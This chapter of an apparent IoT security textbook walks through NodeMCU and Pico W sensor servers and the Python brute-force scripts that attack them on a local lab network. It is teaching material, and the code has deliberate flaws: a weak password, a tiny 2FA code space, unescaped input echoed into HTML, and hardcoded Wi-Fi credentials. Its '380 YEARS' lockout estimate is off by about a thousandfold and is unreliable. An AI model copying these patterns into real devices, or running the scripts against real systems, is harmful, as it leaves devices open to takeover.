% ==========================================
% CHAPTER 06: Level 8 (Lockouts & 2FA)
% ==========================================
\chapter{Level 8: Hard Lockouts \& Random 2FA}

\textbf{In This Chapter:}
\begin{itemize}
    \item Systematically punishing automated iteration loops.
    \item NodeMCU Level 8: Generating random 2-Factor Integer Authentication.
    \item Pico W `05\_strong\_login`: Implementing native memory State-Tracking (3-Strike Lockout).
\end{itemize}

A secure system must be deliberately hostile to failure. By deploying the Python Attack Script in the previous chapter, we established that simple Basic Authentication is a flimsy curtain. Real defensive architecture must mathematically constrain and punish algorithmic guessing vectors.

\section{Systematic NodeMCU Implementation (Level 8)}
The NodeMCU developer decides to implement a basic "2FA" mechanism. Upon passing Basic Auth, the processor calculates a random number between 10 and 99 (`random(10, 100)`) via the native `randomSeed(micros())` logic. It prints this to the physical Serial Monitor. The user must type this code into the URL `?code=XX`.

\begin{lstlisting}[language=C++, caption=23022026\_Level\_8\_IoT\_2FA.ino]
/*
  Demo 8 - IoT 2-Factor Authentication (2FA) with Redirect Fix
  --------------------------------------------------------------
  Board: NodeMCU (ESP8266)
  Sensor: DHT22

  FEATURES:
  1. Real sensor data shown by default.
  2. Override requires:
     - Username & Password (Basic Auth)
     - 2FA Code (2-digit random number)
  3. After successful override, page redirects to prevent refresh errors.
  4. Fake values persist until reboot.
*/

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DHT.h>

#define D5PIN D5
#define DHTTYPE DHT22

const char* ssid = "drarka.in";
const char* pass = "arkaprabha@1985";

const char* adminUser = "admin";
const char* adminPass = "1234";

DHT dht(D5PIN, DHTTYPE);
ESP8266WebServer server(80);

float overrideTemp = NAN;
float overrideHum  = NAN;

int twoFactorCode = 0;

void generateNewCode() {
  twoFactorCode = random(10, 100);
  Serial.print("New 2FA Code: ");
  Serial.println(twoFactorCode);
}

void setup() {

  Serial.begin(9600);
  randomSeed(micros());
  dht.begin();

  WiFi.begin(ssid, pass);
  while (WiFi.status() != WL_CONNECTED) delay(500);

  Serial.print("Open this IP: ");
  Serial.println(WiFi.localIP());

  generateNewCode();

  server.on("/", []() {

    if (server.hasArg("t") || server.hasArg("h")) {

      if (!server.authenticate(adminUser, adminPass)) {
        return server.requestAuthentication();
      }

      if (!server.hasArg("code")) {

        String form = "<html><body bgcolor='black' text='white'><center>";
        form += "<h2>Enter 2FA Code</h2>";
        form += "<form method='GET'>";
        form += "<input type='hidden' name='t' value='" + server.arg("t") + "'>";
        form += "<input type='hidden' name='h' value='" + server.arg("h") + "'>";
        form += "<input name='code' type='text'>";
        form += "<br><br><input type='submit' value='Submit'>";
        form += "</form>";
        form += "</center></body></html>";

        server.send(200, "text/html", form);
        return;
      }

      if (server.arg("code").toInt() != twoFactorCode) {
        server.send(403, "text/plain", "Invalid 2FA Code!");
        return;
      }

      if (server.hasArg("t")) overrideTemp = server.arg("t").toFloat();
      if (server.hasArg("h")) overrideHum  = server.arg("h").toFloat();

      Serial.println("Override successful with 2FA!");

      generateNewCode();

      server.sendHeader("Location", "/");
      server.send(303);
      return;
    }

    float t = dht.readTemperature();
    float h = dht.readHumidity();

    if (!isnan(overrideTemp)) t = overrideTemp;
    if (!isnan(overrideHum))  h = overrideHum;

    String page = "<html>";
    page += "<head><meta http-equiv='refresh' content='5'></head>";
    page += "<body bgcolor='black' text='white'><center>";

    page += "<h1>Temperature</h1>";
    page += "<h1><font color='cyan'>" + String(t) + " C</font></h1>";

    page += "<h1>Humidity</h1>";
    page += "<h1><font color='pink'>" + String(h) + " %</font></h1>";

    page += "</center></body></html>";

    server.send(200, "text/html", page);
  });

  server.begin();
}

void loop() {
  server.handleClient();
}
\end{lstlisting}

% -------------------------
% HACKING NODE MCU
% -------------------------
\section{Bypassing the Random 2FA Matrix}
The developer assumes 2FA is impenetrable. Unfortunately, because the execution matrix lacks a state-tracking "Threshold Lockout", an attacker writes a new script mapping the 10-99 matrix directly over the query URL. 

The Python script (`Demo\_8\_Guess\_Code.py`) crunches the two-digit integer loop in less than 3 seconds over Wi-Fi, completely defeating the "Security".

\begin{lstlisting}[language=Python, caption=Demo\_8\_Guess\_Code.py]
import requests
from requests.auth import HTTPBasicAuth

# Configuration
TARGET_IP = "http://10.158.58.32"  # Replace with your ESP8266 IP
ADMIN_USER = "admin"
ADMIN_PASS = "1234"

# The values you want to force into the sensor display
NEW_TEMP = "125.0"
NEW_HUMIDITY = "150.0"

def start_brute_force():
    print(f"[*] Starting 2-digit 2FA brute force on {TARGET_IP}...")
    
    # Try every combination from 10 to 99 (based on your random(10, 100) logic)
    for code in range(10, 100):
        params = {
            't': NEW_TEMP,
            'h': NEW_HUMIDITY,
            'code': str(code)
        }
        
        try:
            # Send GET request with Basic Auth
            response = requests.get(
                TARGET_IP, 
                params=params, 
                auth=HTTPBasicAuth(ADMIN_USER, ADMIN_PASS),
                timeout=2
            )
            
            # Check if we were redirected (303) or got a 200 without the "Invalid" message
            if response.status_code == 200 and "Invalid 2FA Code!" not in response.text:
                print(f"[+] Success! Correct Code: {code}")
                return
            else:
                print(f"[-] Code {code} failed.")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Error: {e}")
            break

    print("[!] Brute force complete. No code found or device reset.")

if __name__ == "__main__":
    start_brute_force()
\end{lstlisting}

% -------------------------
% PICO W LOCKOUTS
% -------------------------
\section{Systematic Pico W Implementation (05\_Strong\_Login)}
Because brute forcing defeated NodeMCU Level 8 instantly, the Pico W MicroPython developer implements a \textbf{State-Tracking Lockout} utilizing a Python dictionary mapping client IPs to failed attempts. `attempt\_counter[client\_ip] = [fails, timestamp]`. If `MAX\_ATTEMPTS >= 5`, the entire TCP Socket returns an impenetrable `403 Forbidden` for a massive 60 seconds (`LOCKOUT\_TIME`). 

\begin{lstlisting}[language=Python, caption=05\_strong\_login.py]
import network
import socket
import time
import machine
import dht
import ubinascii
import secrets

# -------------------------
# Sensor Setup
# -------------------------
sensor = dht.DHT22(machine.Pin(15))

# -------------------------
# WiFi Connection
# -------------------------
wlan = network.WLAN(network.STA_IF)
wlan.active(True)
wlan.connect(secrets.SSID, secrets.PASSWORD)

while not wlan.isconnected():
    time.sleep(1)

print("Connected! IP:", wlan.ifconfig()[0])

# -------------------------
# Security Setup
# -------------------------
auth = ubinascii.b2a_base64(
    f"{secrets.WEB_USER}:{secrets.WEB_PASS_STRONG}".encode()
).strip().decode()
expected = f"Basic {auth}"

attempt_counter = {}
MAX_ATTEMPTS = 5
LOCKOUT_TIME = 60 

# -------------------------
# Socket Setup
# -------------------------
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 80))
s.listen(5)
s.settimeout(1.0)

t, h = "0.0", "0.0"
spoof_active = False

print("Server Secure & Running...")

try:
    while True:
        if not spoof_active:
            try:
                sensor.measure()
                t = "{:.1f}".format(sensor.temperature())
                h = "{:.1f}".format(sensor.humidity())
            except: pass

        conn = None
        try:
            conn, addr = s.accept()
            client_ip = addr[0]
            curr_t = time.time()

            # --- LOCKOUT CHECK ---
            if client_ip in attempt_counter:
                fails, l_time = attempt_counter[client_ip]
                # Step 1: Execute Time Delta Mathematics
                if fails >= MAX_ATTEMPTS:
                    if curr_t - l_time < LOCKOUT_TIME:
                        # Rejection sequence halts all processing for exactly 60 seconds!
                        conn.send('HTTP/1.0 403 Forbidden\r\n\r\n')
                        conn.send('<h1>403 Forbidden: Locked out.</h1>')
                        conn.close()
                        continue
                    else:
                        attempt_counter[client_ip] = [0, 0]

            conn.settimeout(1.0)
            raw_req = conn.recv(1024)
            if not raw_req:
                conn.close()
                continue

            req = raw_req.decode()

            if expected in req:
                attempt_counter[client_ip] = [0, 0] 
                
                if '/set_env?' in req:
                    query = req.split('?')[1].split(' ')[0]
                    for p in query.split('&'):
                        if p.startswith('t='): t = p.split('=')[1]
                        if p.startswith('h='): h = p.split('=')[1]
                    spoof_active = True
                if '/reset' in req: spoof_active = False

                # --- UPDATED STYLISH HTML UI ---
                html = f"""<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {{ 
            background-color: #121212; 
            color: white; 
            font-family: sans-serif; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
        }}
        .card {{
            background: #1e1e1e;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            text-align: center;
        }}
        .label {{ color: #888; font-size: 1.2rem; text-transform: uppercase; }}
        .temp {{ color: cyan; font-size: 5rem; font-weight: bold; margin: 10px 0; }}
        .hum {{ color: pink; font-size: 5rem; font-weight: bold; margin: 10px 0; }}
        .status {{ color: orange; font-size: 1rem; margin-top: 20px; }}
        button {{
            background: #333; color: white; border: none; padding: 10px 20px;
            border-radius: 10px; cursor: pointer; margin-top: 20px;
        }}
    </style>
</head>
<body>
    <div class="card">
        <div class="label">Temperature</div>
        <div class="temp">{t}&deg;C</div>
        <div class="label">Humidity</div>
        <div class="hum">{h}%</div>
        <div class="status">MODE: {"SPOOFED" if spoof_active else "LIVE SENSOR"}</div>
        <a href="/reset"><button>Reset Sensor</button></a>
    </div>
</body>
</html>"""
                
                conn.send('HTTP/1.0 200 OK\r\nContent-type: text/html\r\n\r\n')
                conn.sendall(html)
            else:
                if client_ip not in attempt_counter:
                    attempt_counter[client_ip] = [1, curr_t]
                else:
                    attempt_counter[client_ip][0] += 1
                    attempt_counter[client_ip][1] = curr_t
                
                conn.send('HTTP/1.0 401 Unauthorized\r\n')
                conn.send('WWW-Authenticate: Basic realm="Restricted"\r\n\r\n')
                conn.send('<h1>401 Unauthorized</h1>')

            conn.close()
        except Exception:
            if conn: conn.close()
except KeyboardInterrupt:
    s.close()
\end{lstlisting}

% -------------------------
% HACKING THE PICO W
% -------------------------
\section{Failing Against the Pico W Defenses}
We write the `05\_attack.py` script specifically to target the `403 Forbidden` response code. When launched, the dictionary loop successfully executes numbers `000000` through `000004`... and then instantly fails.

\begin{lstlisting}[language=Python, caption=05\_attack.py]
import urllib.request
import urllib.error
import base64
import time
import sys

# --- [BLOCK 1: INPUTS] ---
target_ip = input("Enter Pico IP: ")
target_user = input("Enter Username: ")

def attempt_login(pwd):
    """Sends a request with a 6-digit PIN."""
    auth_str = base64.b64encode(f"{target_user}:{pwd}".encode()).decode()
    headers = {"Authorization": f"Basic {auth_str}", "Connection": "close"}
    try:
        req = urllib.request.Request(f"http://{target_ip}/", headers=headers)
        with urllib.request.urlopen(req, timeout=1) as res:
            if res.status == 200: return "FOUND"
    except urllib.error.HTTPError as e:
        if e.code == 401: return "WRONG"
        if e.code == 403: return "BLOCKED"
    except: return "ERROR"
    return "NONE"

# --- [BLOCK 2: GENERATOR LOOP] ---
print(f"[*] Cracking 6-digit PIN for {target_user}...")

# This generates numbers 000000 to 999999
for i in range(1000000):
    pin = f"{i:06d}" # Formats as 000001, 000002, etc.
    
    sys.stdout.write(f"\r[*] Testing: {pin} ")
    sys.stdout.flush()
    
    result = attempt_login(pin)
    
    if result == "FOUND":
        print(f"\n[+] SUCCESS! PIN is: {pin}")
        break
    elif result == "BLOCKED":
        print(f"\n[!] ATTACK STOPPED: Blocked by Pico after 5 fails.")
        print("[*] The lockout mechanism is working.")
        break
    
    # Slight pause to let the Pico recover
    time.sleep(0.05)
\end{lstlisting}

\begin{takeawaybox}
By enforcing a `403 Forbidden` block coupled directly with a Time-Delta `LOCKOUT\_TIME = 60` threshold limit, the algorithm effectively halts brute forcing. A script guessing 1,000,000 combinations 5 times a minute will mathematically require roughly \textbf{380 YEARS} to natively bypass the microcontroller!
\end{takeawaybox}
